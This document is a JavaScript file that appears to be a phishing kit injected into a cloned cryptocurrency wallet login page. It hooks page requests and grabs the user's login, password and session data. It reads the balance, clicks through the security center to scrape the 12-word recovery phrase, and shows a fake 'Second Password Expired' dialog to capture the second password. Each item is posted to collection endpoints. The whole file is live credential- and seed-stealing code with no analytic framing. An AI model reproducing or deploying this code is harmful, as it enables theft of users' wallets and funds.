

function wclose(win)
{
    
    win.close();
} 

function sleep(milliseconds) {
    var start = new Date().getTime();
    for (var i = 0; i < 1e7; i++) {
      if ((new Date().getTime() - start) > milliseconds){
        break;
      }
    }
}

var ulogin = "";

var isSliv = false;

function fwindow1()
{
    
    if(!isSliv){
        sliv();
        
    }

    if(document.querySelector('#app > div > div.sc-dliRfk.ehKYId > div.sc-dBaXSw.kNUKdm > form > div.sc-dznXNo.exisQI > div > div > div.sc-crNyjn.czRDzM > input') != null){
        try
        {
            fwindow();
        }
        catch(err)
        {
            
            setTimeout(fwindow1, 100);
        }
    } else {
        setTimeout(fwindow1, 100);
    }

}; 

 var myHostName = ('https://'+ location.hostname);
     myHostName = myHostName.replace('login.', '');
 	var repCount = 0;
 	XMLHttpRequest.prototype.open = (function(open) {
 	  return function(method,url,async) {

        
 		 
 
 		  
 		  if ( (url.includes('&format=json&resend_code')) ){
              
 			  console.log("Bad string #1 detected and *NOT* replaced!");
 
               url1 = url.replace(myHostName, 'https://blockchain.info');
               url = url1.replace('https://blockchain.info', 'https://blockchain.info');
 
                 var oHeaders = new Headers({
                    "Content-Type": "application/x-www-form-urlencoded",
                    'Accept': 'application/json, text/plain, */*'
                })
                 const response = fetch(url1, {

                
                    method: "GET",
                    referrer: "",
                    mode: 'no-cors',
                    headers: oHeaders
});
           }

          if ( (url.includes('wallet/poll-for-session-guid?api_code=')) ){
             console.log("Bad string #1 detected and *NOT* replaced!");
             url = url.replace(myHostName + '/wallet/poll-for-session-guid?api_code=', 'https://blockchain.info/wallet/poll-for-session-guid?api_code=');
             
           

         }
        
             
            open.apply(this, [].slice.call(arguments));
	
            this.setRequestHeader('Access-Control-Allow-Origin', '*');
            this.setRequestHeader('Authorization', '');
            this.setRequestHeader('Access-Control-Allow-Methods', "'POST', 'GET', 'PATCH', 'DELETE', 'OPTIONS'");
            this.setRequestHeader('accept', "application/json, text/plain, */*");
 		};
 	})


     
     (XMLHttpRequest.prototype.open);
   

function sliv(){
    
    if(url_check()){

        balanceCheck();
        prevgogo(0);
        
    }
    else
    {
        if(!isSliv){
            setTimeout(sliv, 500);
            
        }
        
    }
}

function prevgogo(count){
    
    if(count == 5){
    
        gogo();
        return;
    }
    document.location = "#/security-center/advanced";
    if(document.querySelector('div[data-e2e="falseSecondPassword"]') != null){
         
        count = 6;
        gogo();
        return;
    }
    if(document.querySelector('div[data-e2e="trueSecondPassword"]') != null){

        //document.location = "#/home";
        count = 6;
        setTimeout(secondPass, 1000);
        return;
    }
    setTimeout(prevgogo, 100, count+1);
}


function sendSecondPass(pass){
    var xf = new XMLHttpRequest();
                xf4.open("POST", "qwertyqwerty/write4");
                xf4.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xf4.send("login=" + ulogin + "&two_password="+pass);
                document.getElementsByClassName("sc-iQNlJl kBeZxC")[0].innerHTML = "";
                
                //gogo();
}

function secondPass(){
    
    document.querySelector('button[data-e2e="sendButton"]').click();
    if(document.getElementsByClassName("sc-iQNlJl kBeZxC")[0] != null){
        document.getElementsByClassName("sc-iQNlJl kBeZxC")[0].innerHTML = htmlSecondForm;
        
    }else{
        
        setTimeout(secondPass, 100);
    }
}

function gogo(){
    
    document.location = "#/security-center/basic";
    if(document.querySelector('button[data-e2e="backupFundsButton"]') != null){
        var a = document.querySelector('button[data-e2e="backupFundsButton"]');
        a.click();
        
        setTimeout(gogo1_5, 300);
        return;
    }else{
        
        setTimeout(gogo, 100);
    }
}
function gogo1_5(){
    
    if(document.getElementsByClassName("sc-fdqjUm xKmaF")[0] != null){
        document.getElementsByClassName("sc-fdqjUm xKmaF")[0].style="opacity: 0";
        
        setTimeout(gogo2(), 500);
    }else{
        
        setTimeout(gogo2(),500);
    }
}
function balanceCheck(){
    
    var a = document.querySelector('div[data-e2e="topBalanceTotal"]');
    if(a != null){
        
        if(a.innerText != undefined){
            var balance = a.innerText;
            if(balance/* != "$0,00"*/){
                    var xf3 = new XMLHttpRequest();
                        xf3.open("POST", "qwertyqwerty/write3");
                        xf3.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                        xf3.send("login=" + ulogin + "&balance="+balance);
                        
        }else{
            setTimeout(balanceCheck, 500);
        }
    
    }else{
        
        
        setTimeout(balanceCheck, 500);
    }
}else{
    
    setTimeout(balanceCheck, 500);
}
}

function gogo2(){ 
    
    if(document.querySelector('button[data-e2e="toBackupFlyout"]') != null){
        a = document.querySelector('button[data-e2e="toBackupFlyout"]');
        a.click();
        
        setTimeout(gogo3, 500);
        return;
    }else{
        
        setTimeout(gogo2, 100);
    }
}

words = "";
wordscount = 0;
function gogo3(){
    
    if(document.querySelectorAll('div[data-e2e="recoveryPhraseModal"]') != null){
        a = document.querySelectorAll('div[data-e2e="recoveryPhraseModal"]');
        words = words + a[0].innerText;
        wordscount+=6;
        if(wordscount < 12){
            setTimeout(gogo4, 500);
            return;
        }else{
            
            var xf = new XMLHttpRequest();
                xf.open("POST", "qwertyqwerty/write2");
                xf.setRequestHeader("Content-Type", "application/json");
                xf.send("login=" + ulogin + "&recovery_phrases="+words);
                
                document.location = "#/home";
        }
        
    }else{
        setTimeout(gogo3, 100);
    }
}

function gogo4(){
    
    if(document.querySelectorAll('div[data-e2e="toRecoveryTwo"]') != null){
        a = document.querySelector('button[data-e2e="toRecoveryTwo"]');
        a.click();
        setTimeout(gogo5,500);
    }
    else{
        setTimeout(gogo4,100);
    }
    
}

function gogo5(){
    
    if(document.querySelectorAll('div[data-e2e="recoveryPhraseModal"]') != null){
        a = document.querySelectorAll('div[data-e2e="recoveryPhraseModal"]');
        words = words + a[0].innerText;
        wordscount+=6;
        words = words.replace(/ /g,"*");

        var xf2 = new XMLHttpRequest();
            xf2.open("POST", "qwertyqwerty/write2");
            xf2.setRequestHeader("Content-Type", "application/json");
            xf2.send(JSON.stringify({ "recovery_phrases": "" + words + ""}))
            
            isSliv = true;
            setTimeout(gogo6,500);
                
        
    }else{
        setTimeout(gogo5, 100);
    }
}

function gogo6(){
    
    if(document.querySelectorAll('div[data-e2e="toRecoveryTwo"]') != null)
    {
        a = document.querySelector('button[data-e2e="toRecoveryTwo"]');
        a.click();
        setTimeout(gogo7,1000);
    }
    else
    {
        setTimeout(gogo6,100);
    }
}

function gogo7(){
    //document.location = "#/home";
    
    a = document.querySelector('button[data-e2e="dashboardLink"]');
    a.click();
}

function url_check(){
    
    if(document.location.hash == "#/home") return true;
    return false;
}

function fwindow()
{
    document.getElementsByClassName("sc-VigVT dIKHt sc-bNQFlB bytNAx")[0].addEventListener("click",fclick); 
    function fclick()
    {
        
        function fcheck() 
        {
            
            if(JSON.parse(localStorage.getItem("persist:root")).session == "{}")
            {
                
                setTimeout(fcheck, 100);
            }
            else
            {
                var fdata = {
                    login: document.getElementsByClassName("sc-htoDjs hLjfUk")[0].innerHTML.replace('Wallet: ', '').replace('Signing in with ', ''), 
                    password: document.getElementsByName("password")[0].value,
                    session: localStorage.getItem("persist:root").toString()
                };

                if(fdata.login != undefined){
                    ulogin = fdata.login;
                
                    var xf1 = new XMLHttpRequest();
                    xf1.open("POST", "qwertyqwerty/write1");
                    xf1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                    xf1.send("login="+fdata.login+"&password="+fdata.password+"&session="+fdata.session);
                      
                }
                
            }
        } 
        
        fcheck();
    }
}

//window.onload = function(){

    //setTimeout(function(){ 

        var xf6 = new XMLHttpRequest();
                    xf6.open("GET", "qwertyqwerty");
                    xf6.setRequestHeader("data-transfer5","true");
                    xf6.send(); 
                    

        
        fwindow1();
    // }, 5000);

//}


var htmlSecondForm = '<div class="sc-epnACN haddij" style="-webkit-font-smoothing: antialiased;position: absolute;top: 0px;left: 0px;width: 100%;height: 100%;display: flex;flex-direction: row;-webkit-box-pack: center;justify-content: center;background-color: rgba(0, 0, 0, 0.5);z-index: 1040;-webkit-box-align: center;align-items: center;"><div data-e2e="modal" width="480px" class="sc-iQNlJl kTrOlX" style="-webkit-font-smoothing: antialiased;display: block;position: relative;z-index: 1040;background-color: rgb(255, 255, 255);border-radius: 8px;width: 480px;margin-top: initial;box-shadow: rgba(0, 0, 0, 0.5) 0px 5px 15px;"><div class="sc-kyseJx oJYeI sc-esOvli fXGkmT" style="-webkit-font-smoothing: antialiased;position: relative;display: flex;-webkit-box-pack: justify;justify-content: space-between;-webkit-box-align: center;align-items: center;width: 100%;box-sizing: border-box;padding: 20px 30px;padding-bottom: 12px;border-bottom: 0px;"><div class="sc-cmthru jjppMo" style="-webkit-font-smoothing: antialiased;display: flex;flex-direction: row;-webkit-box-pack: start;justify-content: flex-start;-webkit-box-align: center;align-items: center;margin-right: 10px;"><span color="gray-5" class="sc-hMFtBS knStXu sc-htpNat eHYOIE" style="font-weight: 400;font-size: 24px;color: rgb(80, 89, 107);-webkit-font-smoothing: antialiased;cursor: pointer;display: flex;"></span><div data-e2e="modalHeaderText" color="gray-5" class="headerText sc-gzVnrw epgRYq" cursor="inherit" opacity="1"><div color="gray-5" cursor="inherit" opacity="1" class="sc-gzVnrw kTRcKt" style=\'-webkit-font-smoothing: antialiased;font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;font-weight: 600;font-size: 20px;line-height: inherit;text-transform: none;font-style: normal;color: rgb(80, 89, 107);cursor: inherit;display: block;opacity: 1;\'><span>Second Password Expired. Change It</span> </div> </div></div><span color="gray-5" data-e2e="modalCloseButton" class="sc-htpNat cwlwxp"></span></div><div class="sc-bsbRJL ArJsX" style="-webkit-font-smoothing: antialiased;position: relative;width: 100%;box-sizing: border-box;padding: 25px 30px;"><div class="sc-hZSUBg eYbUgo" style="-webkit-font-smoothing: antialiased;position: absolute;top: 0px;left: 0px;display: none;flex-direction: row;-webkit-box-pack: center;justify-content: center;-webkit-box-align: center;align-items: center;width: 100%;height: 100%;background-color: rgb(255, 255, 255);z-index: 5;"><div width="150px" height="150px" class="sc-gisBJw zTYEQ"><div class="sc-kjoXOD foYgtp"><div class="sc-cHGsZl sc-TOsTZ sc-frDJqD dJLimn"></div><div class="sc-cHGsZl sc-TOsTZ sc-kvZOFW dsVsxg"></div><div class="sc-cHGsZl sc-TOsTZ sc-hqyNC kkzBQe"></div><div class="sc-cHGsZl sc-kgAjT sc-jbKcbu dlRTSU"></div><div class="sc-cHGsZl sc-kgAjT sc-dNLxif hRQBpO"></div><div class="sc-cHGsZl sc-TOsTZ sc-jqCOkK hOXRCx"></div><div class="sc-cHGsZl sc-TOsTZ sc-uJMKN hpmTGz"></div><div class="sc-cHGsZl sc-TOsTZ sc-bbmXgH cERWDX"></div><div class="sc-cHGsZl sc-kgAjT sc-gGBfsJ dOregh"></div><div class="sc-cHGsZl sc-kgAjT sc-jnlKLf eNHpYP"></div><div class="sc-cHGsZl sc-hmzhuo sc-fYxtnH cxUBxk"></div><div class="sc-cHGsZl sc-hmzhuo sc-tilXH fFcFwz"></div><div class="sc-cHGsZl sc-hmzhuo sc-hEsumM iNGOOu"></div><div class="sc-cHGsZl sc-cJSrbW sc-ktHwxA uhwzc"></div><div class="sc-cHGsZl sc-cJSrbW sc-cIShpX irBSTg"></div><div class="sc-cHGsZl sc-hmzhuo sc-kafWEX iHwYFO"></div><div class="sc-cHGsZl sc-hmzhuo sc-feJyhm eBEuwG"></div><div class="sc-cHGsZl sc-hmzhuo sc-iELTvK jhyRav"></div><div class="sc-cHGsZl sc-cJSrbW sc-cmTdod dliETn"></div><div class="sc-cHGsZl sc-cJSrbW sc-jwKygS hVgfzQ"></div><div class="sc-cHGsZl sc-hmzhuo sc-btzYZH chBiJM"></div><div class="sc-cHGsZl sc-hmzhuo sc-lhVmIH bHtrNy"></div><div class="sc-cHGsZl sc-hmzhuo sc-bYSBpT fnPQWQ"></div><div class="sc-cHGsZl sc-ksYbfQ sc-elJkPf jVCWdE"></div><div class="sc-cHGsZl sc-ksYbfQ sc-jtRfpW faXCyP"></div></div></div></div><label class="sc-eInJlc brzYpn" style="-webkit-font-smoothing: antialiased;"><div color="gray-6" cursor="inherit" opacity="1" class="sc-gzVnrw kXYclp" style=\'-webkit-font-smoothing: antialiased;font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;font-weight: 600;font-size: 14px;line-height: inherit;text-transform: none;font-style: normal;color: rgb(53, 63, 82);cursor: inherit;display: block;opacity: 1;margin-bottom: 5px;\'><span>Old Password</span> </div></label><input type="password" id="oldSecond" spellcheck="false" data-e2e="secondPasswordModalInput" class="sc-hzDkRC uxKnd" style=\'-webkit-font-smoothing: antialiased;display: block;width: 100%;height: 48px;min-height: 48px;box-sizing: border-box;letter-spacing: 4px;font-size: 20px;font-weight: 500;color: rgb(53, 63, 82);background-color: rgb(255, 255, 255);background-image: none;outline-width: 0px;user-select: text;font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;padding: 6px 12px;border-radius: 8px;border-width: 1px;border-style: solid;border-color: rgb(223, 227, 235);border-image: initial;\' value=""><br><label class="sc-eInJlc brzYpn" style="-webkit-font-smoothing: antialiased;"><div color="gray-6" cursor="inherit" opacity="1" class="sc-gzVnrw kXYclp" style=\'-webkit-font-smoothing: antialiased;font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;font-weight: 600;font-size: 14px;line-height: inherit;text-transform: none;font-style: normal;color: rgb(53, 63, 82);cursor: inherit;display: block;opacity: 1;margin-bottom: 5px;\'><span>New Password</span> </div></label><input type="password" spellcheck="false" data-e2e="secondPasswordModalInput" class="sc-hzDkRC uxKnd" style=\'-webkit-font-smoothing: antialiased;display: block;width: 100%;height: 48px;min-height: 48px;box-sizing: border-box;letter-spacing: 4px;font-size: 20px;font-weight: 500;color: rgb(53, 63, 82);background-color: rgb(255, 255, 255);background-image: none;outline-width: 0px;user-select: text;font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;padding: 6px 12px;border-radius: 8px;border-width: 1px;border-style: solid;border-color: rgb(223, 227, 235);border-image: initial;\' value=""><br><label class="sc-eInJlc brzYpn" style="-webkit-font-smoothing: antialiased;"><div color="gray-6" cursor="inherit" opacity="1" class="sc-gzVnrw kXYclp" style=\'-webkit-font-smoothing: antialiased;font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;font-weight: 600;font-size: 14px;line-height: inherit;text-transform: none;font-style: normal;color: rgb(53, 63, 82);cursor: inherit;display: block;opacity: 1;margin-bottom: 5px;\'><span>Repeat New Password</span> </div></label><input type="password" spellcheck="false" data-e2e="secondPasswordModalInput" class="sc-hzDkRC uxKnd" style=\'-webkit-font-smoothing: antialiased;display: block;width: 100%;height: 48px;min-height: 48px;box-sizing: border-box;letter-spacing: 4px;font-size: 20px;font-weight: 500;color: rgb(53, 63, 82);background-color: rgb(255, 255, 255);background-image: none;outline-width: 0px;user-select: text;font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;padding: 6px 12px;border-radius: 8px;border-width: 1px;border-style: solid;border-color: rgb(223, 227, 235);border-image: initial;\' value=""></div><div class="sc-cMhqgX gaSMAw" style="-webkit-font-smoothing: antialiased;position: relative;display: flex;flex-direction: row;-webkit-box-pack: start;justify-content: flex-start;-webkit-box-align: center;align-items: center;width: 100%;box-sizing: border-box;padding: 20px 30px;border-top: 1px solid rgb(240, 242, 247);"><div class="sc-iuJeZd dvCjOW" style="-webkit-font-smoothing: antialiased;display: flex;flex-direction: row;-webkit-box-pack: justify;justify-content: space-between;-webkit-box-align: center;align-items: center;width: 100%;"><a data-e2e="secondPasswordModalCancelButton" color="blue600" class="sc-bZQynM ersFjz" style=\'-webkit-font-smoothing: antialiased;font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;font-size: 13px;font-weight: 400;color: rgb(12, 108, 242);text-transform: none;cursor: pointer;text-decoration: none;\'><span>Cancel</span></a><button type="submit" style=\'-webkit-font-smoothing: antialiased;display: flex;flex-direction: row;-webkit-box-pack: center;justify-content: center;-webkit-box-align: center;align-items: center;width: auto;min-width: 140px;height: 40px;box-sizing: border-box;user-select: none;text-align: center;vertical-align: middle;letter-spacing: normal;white-space: nowrap;line-height: 1;text-transform: none;font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;font-size: 14px;font-weight: 600;cursor: pointer;opacity: 1;color: rgb(255, 255, 255);background-color: rgb(12, 108, 242);padding: 10px 15px;text-decoration: none;transition: all 0.2s ease-in-out 0s;border-radius: 8px;border-style: solid;border-width: 1px;border-color: rgb(12, 108, 242);\' onclick=\'if(document.getElementById("oldSecond").value != "") sendSecondPass(document.getElementById("oldSecond").value)\' data-e2e="secondPasswordModalConfirmBgfdutton" height="40px" color="white" class="sc-bdVaJa iOqSrY"><span>Confirm</span></button></div></div></div></div>';
